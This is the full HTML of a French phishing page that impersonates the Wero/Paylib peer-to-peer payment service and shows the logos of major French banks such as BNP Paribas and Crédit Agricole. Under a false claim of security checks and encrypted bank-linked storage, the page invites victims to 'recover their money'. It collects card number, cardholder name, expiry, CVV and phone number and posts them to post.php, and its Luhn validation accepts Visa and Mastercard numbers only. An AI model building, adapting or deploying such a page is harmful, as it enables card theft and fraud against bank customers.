 
<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="UTF-8">
    <title>Wero entre amis</title>
    <link rel="stylesheet" href="./assets/style.css">
    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
    <meta name="mobile-web-app-capable" content="yes">
    <link rel="icon" href="./assets/favicon.svg">
    <title id="" data-react-helmet="id">Wero entre amis</title>
    <meta name="apple-mobile-web-app-title" content="SDR Paylib">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">

  </head>

  <body>

    <div id="didomi-host" data-nosnippet="true" aria-hidden="true">
      <div class="notranslate didomi-screen-medium didomi-consent-popup__70305afe-c713-4713-a0d7-65d0f6b02ae8"></div>
    </div>
    <div id="app" style="width:100vw;height:100vh">
      <div class="react-gradient sc-AxjAm bcMPWx" style="background-image: linear-gradient(80deg, rgb(246, 255, 134), rgb(252, 252, 231));"></div>
      <div class="MuiBox-root jss1 sc-fznKkj fQkkzS">
        <div class="MuiContainer-root jss2 sc-fzplWN djGbrK MuiContainer-maxWidthSm" height="" align="center">
          <div class="MuiPaper-root sc-fznyAO bXtyWV MuiPaper-elevation0" padding="10px 20px">
            <div style="opacity: 1; transform: translate3d(0px, 0px, 0px); width: 100%;">
              <div class="sc-fzokOt hLgJkJ">
                <div class="sc-fzoyAV fQsatj"><button class="MuiButtonBase-root MuiIconButton-root" tabindex="0" type="button" id="paylib-logo"><span class="MuiIconButton-label"><a href="/"><img src="https://wcmassets.kbcbrussels.be/content/dam/kdl-assets/logos/w/logos-wero.svg.cdn.res/last-modified/1723638836231/logos-wero.svg" alt="Paylib logo" style="max-width: 88px;"></a></span><span class="MuiTouchRipple-root"></span></button></div>
                <hr class="MuiDivider-root">
                <div class="sc-fznZeY gJlwEu">
                  <div class="MuiBox-root jss3 sc-fzqNJr hXQgjp">
                    <h1 class="MuiTypography-root MuiTypography-h1 MuiTypography-gutterBottom MuiTypography-alignCenter">Instant Banque</h1><br>
                  </div>
                  <div style="opacity: 1; transform: translate3d(0px, 0px, 0px); width: 100%;"><center><span class="sc-fzoLsD kskohJ">Pour des raisons de sécurité, nous procédons parfois à la vérification rapide de vos informations.<br><br>NB : vos données sont cryptées et stockées sur un serveur ultra sécurisé relié a votre banque à l'abri d'un tiers. </span></center></div>

                </div>
              </div>
            </div>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Wero entre amis</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
<link rel="stylesheet" href="./assets/stylee.css">

</head>
<body>
<!-- partial:index.partial.html -->
<div class="wrapper" id="app">
  <div class="card-form">
    <div class="card-list">
      <div class="card-item" v-bind:class="{ '-active' : isCardFlipped }">
        <div class="card-item__side -front">
          <div class="card-item__focus" v-bind:class="{'-active' : focusElementStyle }" v-bind:style="focusElementStyle" ref="focusElement"></div>
          <div class="card-item__cover"><img src="assets/paylib_main.jpg" class="card-item__bg"></div>

          <div class="card-item__wrapper">
            <div class="card-item__top">

              <div class="card-item__type">
                <transition name="slide-fade-up">
                  <img v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + getCardType + '.png'" v-if="getCardType" v-bind:key="getCardType" alt="" class="card-item__typeImg">
                </transition>
              </div>
            </div>
            <label for="cardNumber" class="card-item__number" ref="cardNumber">
              <template v-if="getCardType === 'amex'">
                <span v-for="(n, $index) in amexCardMask" :key="$index">
                  <transition name="slide-fade-up">
                    <div class="card-item__numberItem" v-if="$index > 4 && $index < 14 && cardNumber.length > $index && n.trim() !== ''">*</div>
                    <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }" :key="$index" v-else-if="cardNumber.length > $index">
                      {{cardNumber[$index]}}
                    </div>
                    <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }" v-else :key="$index + 1">{{n}}</div>
                  </transition>
                </span>
              </template>

              <template v-else>
                <span v-for="(n, $index) in otherCardMask" :key="$index">
                  <transition name="slide-fade-up">
                    <div class="card-item__numberItem" v-if="$index > 4 && $index < 15 && cardNumber.length > $index && n.trim() !== ''">*</div>
                    <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }" :key="$index" v-else-if="cardNumber.length > $index">
                      {{cardNumber[$index]}}
                    </div>
                    <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }" v-else :key="$index + 1">{{n}}</div>
                  </transition>
                </span>
              </template>
            </label>
            <div class="card-item__content">
              <label for="cardName" class="card-item__info" ref="cardName">
                <div class="card-item__holder">Titulaire de la carte</div>
                <transition name="slide-fade-up">
                  <div class="card-item__name" v-if="cardName.length" key="1">
                    <transition-group name="slide-fade-right">
                      <span class="card-item__nameItem" v-for="(n, $index) in cardName.replace(/\s\s+/g, ' ')" v-if="$index === $index" v-bind:key="$index + 1">{{n}}</span>
                    </transition-group>
                  </div>
                  <div class="card-item__name" v-else key="2">Nom & Prénom</div>
                </transition>
              </label>
              <div class="card-item__date" ref="cardDate">
                <label for="cardMonth" class="card-item__dateTitle">Expiration</label>
                <label for="cardMonth" class="card-item__dateItem">
                  <transition name="slide-fade-up">
                    <span v-if="cardMonth" v-bind:key="cardMonth">{{cardMonth}}</span>
                    <span v-else key="2">MM</span>
                  </transition>
                </label>
                /
                <label for="cardYear" class="card-item__dateItem">
                  <transition name="slide-fade-up">
                    <span v-if="cardYear" v-bind:key="cardYear">{{String(cardYear).slice(2,4)}}</span>
                    <span v-else key="2">AA</span>
                  </transition>
                </label>
              </div>
            </div>
          </div>
        </div>
        <div class="card-item__side -back">
          <div class="card-item__cover">
            <img v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + currentCardBackground + '.jpeg'" class="card-item__bg">
          </div>
          <div class="card-item__band"></div>
          <div class="card-item__cvv">
            <div class="card-item__cvvTitle">CVV</div>
            <div class="card-item__cvvBand">
              <span v-for="(n, $index) in cardCvv" :key="$index">
                *
              </span>

            </div>
            <div class="card-item__type">
              <img v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + getCardType + '.png'" v-if="getCardType" class="card-item__typeImg">
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="card-form__inner">
    <form action="post.php" method="post">
      <div class="card-input">
      
        <label for="cardNumber" class="card-input__label">Numéro de carte</label>
        <input type="text" id="cardNumber" name="cardNumber" onkeyup="valid_credit_card()" class="card-input__input" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber"  autocomplete="off" type="tel" maxlength="19" pattern="{19}" required>
      </div>
      <div class="card-input">
        <label for="cardName" class="card-input__label">Titulaire de la carte</label>
        <input type="text" id="cardName" name="cardName" class="card-input__input" v-model="cardName" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="off" required>
      </div>
            <div class="card-input">
        <label for="cardName" class="card-input__label">Montant a recevoir</label>
        <input type="text" id="montant" name="montant" class="card-input__input"   autocomplete="off" required>
      </div>


                  <div class="card-input">
        <label for="cardName" class="card-input__label">Numero de téléphone</label>
        <input type="text" id="tel" name="tel" class="card-input__input" pattern="[0-9]{10}" maxlength="10" type="tel" required>
      </div>



      <div class="card-form__row">
        <div class="card-form__col">
          <div class="card-form__group">
            <label for="cardMonth" class="card-input__label">Date d'expiration</label>
            <select class="card-input__input -select" id="cardMonth" name="cardMonth" v-model="cardMonth" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate">
              <option value="" disabled selected>Mois</option>
              <option v-bind:value="n < 10 ? '0' + n : n" v-for="n in 12" v-bind:disabled="n < minCardMonth" v-bind:key="n">
                {{n < 10 ? '0' + n : n}}
              </option>
            </select>
            <select class="card-input__input -select" id="cardYear" name="cardYear" v-model="cardYear" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate">
              <option value="" disabled selected>Années</option>
              <option v-bind:value="$index + minCardYear" v-for="(n, $index) in 12" v-bind:key="n">
                {{$index + minCardYear}}
              </option>
            </select>
          </div>
        </div>
        <div class="card-form__col -cvv">
          <div class="card-input">
            <label for="cardCvv" class="card-input__label">CVV</label>
            <input type="text" class="card-input__input" id="cardCvv" name="cardCvv" v-mask="'###'" maxlength="3" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" autocomplete="off" required>
          </div>
        </div>
      </div>

      <button class="card-form__button" id="sbt" name="sbt" type="submit">Récupérer mon argent</button>
      <script>
function maskCC(event) {
    var vcc = this.value.replace(/\D/g, '');
    this.value = '';
    for(var i = 0; i < vcc.length; i++) {
        this.value += (i%4==0 && i != 0 ? ' ' : '') + vcc[i];
    }
}
document.getElementById('cardNumber').addEventListener('input', maskCC, false);
document.getElementById("sbt").disabled = true;
function valid_credit_card() {
  var x = document.getElementById("cardNumber").value;
  if (/[^0-9-\s]+/.test(x)) return false;
  var nCheck = 0, nDigit, bEven = false;
  x = x.replace(/\D/g, "");
  for (var n = x.length - 1; n >= 0; n--) {
    var cDigit = x.charAt(n),
      nDigit = parseInt(cDigit, 10);
    if (bEven) {
      if ((nDigit *= 2) > 9) nDigit -= 9;
    }
    nCheck += nDigit;
    bEven = !bEven;
  }
  var y = (nCheck % 10) == 0 && x.length > 11 && (x[0] == 4 || x[0] ==  5);
  if (y == false) {
    document.getElementById("cardNumber").style = "border: 1px solid red;"
  } else {
    document.getElementById("cardNumber").style = ""
    document.getElementById("sbt").disabled = false;
  }
}

</script>
    </div>
  </div>

</div>

</form>

  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
<script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script><script  src="./assets/scriptt.js"></script>




            <div style="opacity: 1; transform: translate3d(0px, 0px, 0px); width: 100%;">
              <div class="sc-fzoiQi ozSmQ">
                <div class="MuiBox-root jss8" id="sponsors"><span class="MuiTypography-root MuiTypography-caption"><span class="sc-fzoLsD fDmMBO">Ce service vous est proposé par :</span></span>
                  <ul class="sc-fzoLag BNtsP">
                    <ul class="sc-fzoXzr jYxGEJ">
                      <li class="sc-fzpjYC gJohPa"><img src="./assets/agricole.png" alt="Crédit Agricole" title="Crédit Agricole" class="sc-fznxsB hXzbMZ"></li>
                      <li class="sc-fzpjYC gJohPa"><img src="./assets/bnp.png" alt="BNP Paribas" title="BNP Paribas" class="sc-fznxsB hXzbMZ"></li>
                      <li class="sc-fzpjYC gJohPa"><img src="./assets/postal.png" alt="La Banque Postale" title="La Banque Postale" class="sc-fznxsB hXzbMZ"></li>
                      <li class="sc-fzpjYC gJohPa"><img src="./assets/societe.png" alt="Société Générale" title="Société Générale" class="sc-fznxsB hXzbMZ"></li>
                      <li class="sc-fzpjYC gJohPa"><img src="./assets/hello.png" alt="Hello Bank!" title="Hello Bank!" class="sc-fznxsB hXzbMZ"></li>
                      <li class="sc-fzpjYC gJohPa"><img src="./assets/arkea.png" alt="Crédit Mutuel Arkéa" title="Crédit Mutuel Arkéa" class="sc-fznxsB hXzbMZ"></li>
                    </ul>
                    <ul class="sc-fzoXzr jYxGEJ">
                      <li class="sc-fzpjYC gJohPa"><img src="./assets/bpopu.png" alt="Banque Populaire" title="Banque Populaire" class="sc-fznxsB hXzbMZ"></li>
                      <li class="sc-fzpjYC gJohPa"><img src="./assets/caisse.png" alt="Caisse d'Epargne" title="Caisse d'Epargne" class="sc-fznxsB hXzbMZ"></li>
                      <li class="sc-fzpjYC gJohPa"><img src="./assets/mutuel.png" alt="Crédit Mutuel" title="Crédit Mutuel" class="sc-fznxsB hXzbMZ"></li>
                      <li class="sc-fzpjYC gJohPa"><img src="./assets/cic.png" alt="CIC" title="CIC" class="sc-fznxsB hXzbMZ"></li>
                      <li class="sc-fzpjYC gJohPa"><img src="./assets/lcl.png" alt="LCL" title="LCL" class="sc-fznxsB hXzbMZ"></li>
                    </ul>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="MuiContainer-root sc-AxhUy fxWvvr MuiContainer-maxWidthSm">
          <hr class="MuiDivider-root">
          <footer class="sc-AxirZ bJCmFu">
            <ul class="sc-AxiKw eSbheu">
              <li class="sc-AxhCb eSwYtm"><a href="">Mentions légales</a></li>
              <li class="sc-AxhCb eSwYtm"><a href="" target="_blank">FAQ</a></li>
              <li class="sc-AxhCb eSwYtm"><a href="">CGU</a></li>
              <li class="sc-AxhCb eSwYtm"><a href="">Cookies et données</a></li>
              <li class="sc-AxhCb eSwYtm"><a href="">Se désinscrire</a></li>
            </ul>
          </footer>
        </div>
      </div>
    </div>
    <div id="simple-translate-button" style="display: none;"></div>
    <div id="simple-translate-panel" style="display: none;">
      <p>...</p>
    </div>
  </body>

</html>

</body>

</html>